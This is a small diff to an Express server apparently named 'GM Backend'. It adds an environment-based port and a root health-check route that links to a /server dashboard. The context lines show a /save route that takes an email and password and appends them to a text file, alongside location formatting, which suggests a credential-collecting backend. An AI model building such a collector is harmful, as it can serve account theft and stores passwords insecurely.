@@ -3,7 +3,7 @@ const fs = require('fs');
 const path = require('path');
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 const DB_FILE = path.join(__dirname, 'data.txt');
 
 // Middleware
@@ -53,6 +53,12 @@ function formatLocationBlock(body) {
 
   return lines.join('\n');
 }
+
+// ── GET /  ────────────────────────────────────────────────────────────────
+// Simple health check / root route to avoid "Cannot GET /" when hosting on Render
+app.get('/', (req, res) => {
+  res.send('✅ GM Backend is running successfully. <br><br>👉 Go to <a href="/server">/server</a> to view the dashboard.');
+});
 
 // ── POST /save  ─────────────────────────────────────────────────────────────
 // Receives { email, password } and appends a record to data.txt
